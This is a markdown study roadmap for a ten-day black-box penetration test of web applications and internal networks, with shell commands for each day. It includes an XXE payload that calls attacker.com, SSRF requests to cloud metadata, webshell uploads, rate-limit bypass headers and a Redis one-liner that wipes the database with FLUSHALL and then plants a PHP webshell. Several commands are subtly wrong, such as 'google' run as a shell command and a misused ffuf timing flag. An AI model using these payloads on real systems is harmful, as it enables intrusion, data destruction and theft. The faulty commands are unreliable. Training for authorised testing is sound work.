# 🔍 **10-Day Black-Box Penetration Testing Roadmap**

**Target Audience:** Pentesters with **NO source code access** (Internal + Web apps)
**Study Time:** 4-5 hours/day
**Real-world focus:** Production environments, no credentials, external perspective[^1]

***

## Table of Contents

- [Pre-Day 0: Black-Box Pentest Setup](#pre-day-0-black-box-pentest-setup)
- [Day 1: Passive Reconnaissance \& OSINT](#day-1-passive-reconnaissance--osint)
- [Day 2: Active Recon \& Service Enumeration](#day-2-active-recon--service-enumeration)
- [Day 3: Web App Mapping \& Spidering](#day-3-web-app-mapping--spidering)
- [Day 4: Authentication \& Session Attacks](#day-4-authentication--session-attacks)
- [Day 5: Injection Attacks (SQLi/XSS/CSRF)](#day-5-injection-attacks-sqli/xss/csrf)
- [Day 6: Business Logic \& Access Control](#day-6-business-logic--access-control)
- [Day 7: File Uploads, XXE \& Advanced Web](#day-7-file-uploads-xxe--advanced-web)
- [Day 8: Network Services \& Internal Pivot](#day-8-network-services--internal-pivot)
- [Day 9: Automation \& Custom Exploitation](#day-9-automation--custom-exploitation)
- [Day 10: Reporting \& Remediation](#day-10-reporting--remediation)

***

## Pre-Day 0: Black-Box Pentest Setup

**Time Required:** 2-3 hours

### Environment \& Tools

```bash
# Reconnaissance (Passive + Active)
sudo apt install subfinder amass httpx waybackurls gau gospider katana

# Web Testing
sudo snap install burpsuite-community
ffuf gobuster dirsearch sqlmap nuclei

# Network Enumeration
sudo apt install nmap masscan naabu rustscan

# Custom Wordlists
git clone https://github.com/danielmiessler/SecLists
wget https://raw.githubusercontent.com/payatu/diva/master/vulnerable_apps/Wordlists/rajabali.txt
```


### Essential Accounts (FREE)

- **PortSwigger Web Academy**: 200+ FREE black-box labs[^1]
- **HackTheBox**: Starting Point (black-box machines)
- **TryHackMe**: Web Fundamentals path
- **PentesterLab**: FREE bootstrap exercises

***

## Day 1: Passive Reconnaissance \& OSINT

**Study Time:** 4-5 hours

### Morning: Corporate OSINT (2 hours)

#### Tech Stack Fingerprinting

```bash
# Subdomain enumeration (passive)
subfinder -d target.com -all -o subs.txt
cat subs.txt | httpx -silent -o live.txt

# Historical data (Wayback + GAU)
echo "target.com" | waybackurls | tee wayback.txt
echo "target.com" | gau --blacklist png,jpg,css | tee gau.txt
```


#### Employee Recon

```bash
# LinkedIn + GitHub dorks
google "site:linkedin.com target.com employee"
google "target.com password" filetype:txt
```


### Afternoon: Parameter Discovery (2.5 hours)

#### JS Analysis \& Endpoint Mining

```bash
# Extract JS files
cat live.txt | subjs | tee js.txt

# LinkFinder (API endpoints)
python3 LinkFinder.py -i https://target.com/app.js -o endpoints.html

# Parameter discovery
cat wayback.txt gau.txt | grep "?" | uro | tee params.txt
cat params.txt | gf xss sqli redirect | tee vuln_params.txt
```


### Practical Lab

- **PortSwigger**: Information Disclosure labs (5 free)
- **Juice Shop**: Recon challenges


### Today's Checklist

- [ ] 500+ subdomains enumerated
- [ ] 10k+ historical URLs archived
- [ ] JS endpoints + parameters discovered
- [ ] Employee/tech stack mapped

***

## Day 2: Active Recon \& Service Enumeration

**Study Time:** 4-5 hours

### Morning: Network Discovery (2 hours)

#### Comprehensive Port Scanning

```bash
# Fast service discovery
rustscan -a target.com --ulimit 5000

# Full TCP/UDP with NSE scripts
nmap -sC -sV -p- -T4 -oA target.nmap target.com

# Masscan (10k/sec)
masscan -p1-65535 --rate=1000 target.com/24 --exclude 255.255.255.255
```


### Afternoon: Web Directory Bruteforce (2.5 hours)

#### Intelligent Fuzzing

```bash
# FFUF (Smart wordlists)
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u https://target.com/FUZZ -mc 200,301,302,307 -o ffuf.json

# Parameter fuzzing
ffuf -w params.txt -u "https://target.com/page?FUZZ=test" -mc 200,302
```


### Practical Lab

- **HTB Starting Point**: Network enumeration
- **PortSwigger**: Directory traversal labs


### Today's Checklist

- [ ] Full TCP/UDP port scan complete
- [ ] 500+ directories discovered
- [ ] Vulnerable parameters fuzzed
- [ ] Service versions fingerprinted

***

## Day 3: Web App Mapping \& Spidering

**Study Time:** 4-5 hours

### Morning: Application Mapping (2 hours)

#### Intelligent Crawling

```bash
# Gospider (JS + Forms)
gospider -s https://target.com -d 10 -t 20 -o crawl/ -c 50

# Katana (Modern crawler)
katana -u https://target.com -d 5 -jc -silent

# Burp Spider (Manual + Auth)
# Target → Spider → Include all URLs
```


### Afternoon: Technology Fingerprinting (2.5 hours)

#### Wappalyzer + WhatWeb

```bash
whatweb -v https://target.com
# Apache/2.4.41, PHP/7.4.3, jQuery/3.5.1

# Retire.js (JS vulnerabilities)
retire --url https://target.com
```


### Practical Lab

- **PortSwigger**: All spidering labs
- **DVWA**: Technology fingerprinting


### Today's Checklist

- [ ] Complete site map (10k+ URLs)
- [ ] Technology stack identified
- [ ] JS libraries + CVE mapping
- [ ] Authentication flows mapped

***

## Day 4: Authentication \& Session Attacks

**Study Time:** 4-5 hours

### Morning: User Enumeration (2 hours)

#### Timing + Response Analysis

```bash
# Username enumeration
ffuf -w users.txt -u https://target.com/login \
  -X POST -d "username=FUZZ&password=invalid" \
  -mr "Invalid user" -fr "Invalid credentials"

# Rate limit bypass
ffuf -w users.txt -u https://target.com/login \
  -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1"
```


### Afternoon: Session Management (2.5 hours)

#### Cookie Analysis + Bypass

```bash
# Session fixation
curl -c cookies.txt -b cookies.txt https://target.com/login

# JWT attacks (no jwt_tool needed)
echo "eyJhbGciOiJub25..." | base64 -d | jq .  # None algorithm
```


### Practical Lab

- **PortSwigger**: Authentication 15 labs
- **Juice Shop**: Login challenges


### Today's Checklist

- [ ] Username enumeration complete
- [ ] Session fixation vulnerabilities
- [ ] JWT weak signing discovered
- [ ] Password reset flaws

***

## Day 5: Injection Attacks (SQLi/XSS/CSRF)

**Study Time:** 4-5 hours

### Morning: SQL Injection (2 hours)

#### Black-Box Detection

```bash
# Error-based detection
ffuf -w payloads.txt -u "https://target.com/search?q=FUZZ" \
  -fr "mysql_fetch" -fr "PostgreSQL" -fr "ORA-"

# Time-based blind
ffuf -w payloads.txt -u "https://target.com/search?q=FUZZ" \
  -t 10s -fs 100  # Response time analysis
```


### Afternoon: XSS + CSRF (2.5 hours)

#### XSS Hunting

```bash
cat vuln_params.txt | nuclei -t ~/nuclei-templates/xss/ -o xss.txt
gf xss vuln_params.txt | xargs -I {} curl "https://target.com/{}" \
  -d "test<script>alert(1)</script>" | grep -i alert
```


### Practical Lab

- **PortSwigger**: SQLi (18 labs) + XSS (30 labs)
- **DVWA**: All injection levels


### Today's Checklist

- [ ] SQLi confirmed (error/time)
- [ ] 10+ XSS vectors discovered
- [ ] CSRF PoCs generated
- [ ] Injection attack chains

***

## Day 6: Business Logic \& Access Control

**Study Time:** 4-5 hours

### Morning: IDOR Detection (2 hours)

#### Parameter Manipulation

```bash
# Numeric IDOR
curl "https://target.com/user/123"  # My profile
curl "https://target.com/user/124"  # Victim profile!

# UUID prediction
curl "https://target.com/doc/550e8400-e29b-41d4-a716-446655440000"
curl "https://target.com/doc/550e8400-e29b-41d4-a716-446655440001"  # Sequential!
```


### Afternoon: Logic Flaws (2.5 hours)

#### Price/Race Conditions

```bash
# Price manipulation
curl -X POST https://target.com/checkout \
  -d '{"items":[{"id":123,"price":100,"qty":1}]}'  # Normal
curl -X POST https://target.com/checkout \
  -d '{"items":[{"id":123,"price":1,"qty":1}]}'    # HACKED!

# Race condition
for i in {1..100}; do curl -X POST https://target.com/transfer ... & done
```


### Practical Lab

- **PortSwigger**: Access Control (13 labs) + Business Logic (11 labs)
- **Juice Shop**: IDOR + Logic flaws


### Today's Checklist

- [ ] IDOR on 5+ endpoints
- [ ] Price manipulation PoCs
- [ ] Race condition exploitation
- [ ] Business logic bypasses

***

## Day 7: File Uploads, XXE \& Advanced Web

**Study Time:** 4-5 hours

### Morning: File Upload Attacks (2 hours)

#### Bypass Techniques

```bash
# Double extension
evil.php.jpg

# Null byte
shell.php%00.jpg

# Content-Type spoof
curl -X POST -F "file=@shell.php" -H "Content-Type: image/jpeg" \
  https://target.com/upload
```


### Afternoon: XXE + SSRF (2.5 hours)

#### Blind XXE Detection

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
<data>&xxe;</data>
# Monitor DNS callback
```


### Practical Lab

- **PortSwigger**: File Upload (10 labs) + XXE (9 labs)
- **DVWA**: File upload bypasses


### Today's Checklist

- [ ] File upload RCE achieved
- [ ] XXE data exfiltration
- [ ] SSRF internal pivot
- [ ] Advanced web exploits

***

## Day 8: Network Services \& Internal Pivot

**Study Time:** 4-5 hours

### Morning: Internal Service Enumeration (2 hours)

#### Pivot via SSRF/XXE

```bash
# Internal service discovery
https://target.com/ssrf?url=http://127.0.0.1:8080/admin

# Cloud metadata (if SSRF)
https://target.com/ssrf?url=http://169.254.169.254/latest/meta-data/
```


### Afternoon: Service Exploitation (2.5 hours)

#### Common Internal Services

```bash
# Redis (unauthenticated)
redis-cli -h internal.redis FLUSHALL; redis-cli CONFIG SET dir /var/www/; redis-cli CONFIG SET dbfilename shell.php; redis-cli SET x "<?php system($_GET['cmd']); ?>"; redis-cli CONFIG SET dir /var/www/; redis-cli SAVE

# Jenkins (script console)
https://jenkins.internal/script
```


### Practical Lab

- **HTB Starting Point**: Internal pivoting
- **PortSwigger**: SSRF labs (7 free)


### Today's Checklist

- [ ] Internal services discovered
- [ ] Redis/Jenkins exploitation
- [ ] Pivot chains established
- [ ] Network service compromise

***

## Day 9: Automation \& Custom Exploitation

**Study Time:** 4-5 hours

### Morning: Nuclei Templates (2 hours)

#### Vulnerability Scanning

```bash
nuclei -l live.txt -t ~/nuclei-templates/ -o nuclei.txt -c 50
nuclei -l vuln_params.txt -t cves/ -t exposures/ -o cves.txt
```


### Afternoon: Custom Burp Extensions (2.5 hours)

#### Burp Suite Pro Features (Community OK)

```
Intruder: Pitchfork (user:pass)
Scanner: Active + Custom insertions
Repeater: Manual verification
```


### Practical Lab

- **Nuclei**: 100+ template hits verified
- **Burp Intruder**: Parameter fuzzing


### Today's Checklist

- [ ] Nuclei automation complete
- [ ] Burp Intruder campaigns
- [ ] Custom fuzzing dictionaries
- [ ] Exploit verification

***

## Day 10: Reporting \& Remediation

**Study Time:** 4-5 hours

### Morning: Professional Report Structure (2 hours)

#### CVSS Scoring Template

| **Vuln** | **CVSS** | **Impact** | **PoC** |
| :-- | :-- | :-- | :-- |
| SQLi | **9.8** | RCE | Screenshot |
| IDOR | **8.1** | Data leak | Video |
| SSRF | **9.1** | Internal pivot | Burp |

### Afternoon: Remediation Guide (2.5 hours)

```
SQLi → Prepared statements
XSS → Output encoding
IDOR → UUID + authorization checks
SSRF → URL whitelist + internal firewall
```


### Practical Lab

- **Complete pentest report**: 20-page PDF
- **Executive summary**: 1-pager
- **Remediation roadmap**: Prioritized fixes


### Today's Checklist

- [ ] CVSS scoring complete
- [ ] Professional report template
- [ ] Remediation recommendations
- [ ] Portfolio-ready writeup

***

## 🎯 **Black-Box Success Metrics**

```
Discovery: 500+ subdomains, 10k+ URLs, 50+ parameters
Vulnerabilities: 20+ CVSS 7.0+, 5+ Critical (9.0+)
Coverage: 100% black-box (no source/creds)
Exploitation: 80% PoC success rate
```


## 📚 **Essential Resources**

```
PortSwigger Academy: 150+ FREE black-box labs [web:62]
Juice Shop: Complete black-box practice
HTB Starting Point: Network + Web black-box
Nuclei Templates: 10k+ community signatures
```

**Total FREE Value:** \$3000+ enterprise training equivalent
**Certification Path:** eWPT → OSCP → OSWE

**Production-ready black-box methodology** - Deploy → Discover → Exploit → Report 🔍💥

<div align="center">⁂</div>

[^1]: https://portswigger.net/web-security/all-labs

